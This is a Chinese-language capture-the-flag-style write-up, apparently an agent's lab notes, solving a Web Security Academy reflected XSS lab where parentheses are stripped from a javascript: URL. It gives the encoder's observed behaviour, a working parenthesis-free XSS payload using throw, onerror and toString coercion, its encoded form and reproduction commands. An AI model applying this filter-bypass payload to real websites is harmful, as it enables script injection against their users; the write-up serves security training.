---
title: lab-javascript-url-some-characters-blocked
---

# lab-javascript-url-some-characters-blocked

> evidences: [[xss-context-family]]

- 题面:反射 XSS,调 `alert` 且消息含 `1337`。
- 实例(批49):https://0a2a000f035a9b0780581c4b0060007c.web-security-academy.net
- 判定:**solved** — `<section class='academyLabBanner is-solved'>` + `<h4>Congratulations, you solved the lab!</h4>`

## 真实模板(反射槽)

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1%26x%3d<当前 URL 的编码形>'}).finally(_ => window.location = '/')">Back to Blog</a>
```

反射的是**整条请求 URL**,编码后落在 `body:'…'` 串内。

## 编码器(本实例字符级实测)

保留:alnum 与 `" { } | ^ $ , * / ~ _ - . !`(空格→`+`);百分号编码 `' ; : = @ < > & ? +`;**删除 `( ) [ ]` 反引号 反斜杠与所有 `%`**。
⇒ 括弧在任何槽都拿不到;但 `%27` 在**真点击**时被 Chrome 解码回 `'` ⇒ JS 单引号串可破(批48 结论继续成立)。

## 解法载荷(零括弧:借 throw + onerror + 字符串强制转换)

```
/post?postId=1&x='},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

URL 编码形:`%27%7D%2Cx%3Dx%3D%3E%7Bthrow/**/onerror%3Dalert%2C1337%7D%2CtoString%3Dx%2Cwindow%2B%27%27%2C%7Bx%3A%27`
(`postId` 在本实例被整数校验 → 载荷必须另开一个参数承载,外面 400 `"Invalid blog post ID"`。)

展开后的 JS:

```js
fetch('/analytics',{method:'post',body:'/post?postId=1&x='},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
```

- 对象字面量求值把载荷变成 `fetch` 的**追加实参**:箭头体内 `onerror=alert,1337` 把 `window.onerror` 指向 `alert` 并 `throw 1337`;
- `toString=x` 把 `window.toString` 换成该箭头;随后的 `window+''` 触发 ToPrimitive ⇒ 调用箭头 ⇒ 抛出未捕获 `1337` ⇒ `onerror=alert` 收到 `Uncaught 1337` —— 消息含 `1337`;
- `/**/` 充当 token 分隔符:原模板里空格被编码成 `+`,href 里的 `+` 不会还原成空格。

## 触发方式

必须**真手势点击** "Back to Blog"(`javascript:` href):`page_alert <url> --click '.is-linkback a'`。合成 `el.click()` 不执行。

## 复现命令

```
range_launch launch c29f5f30a0c79a94f6a847a63911bfbb403f8d60977b3e3b09110d166711a345 --jar ~/.pi-rs/agent/chrome-jar.json
page_alert 'https://<inst>/post?postId=1&x=%27%7D%2Cx%3Dx%3D%3E%7Bthrow/**/onerror%3Dalert%2C1337%7D%2CtoString%3Dx%2Cwindow%2B%27%27%2C%7Bx%3A%27' --click '.is-linkback a'
```

## 关系

- 族:[[xss-context-family]];判读纪律见 [[javascript-url-execution-needs-real-gesture]]。
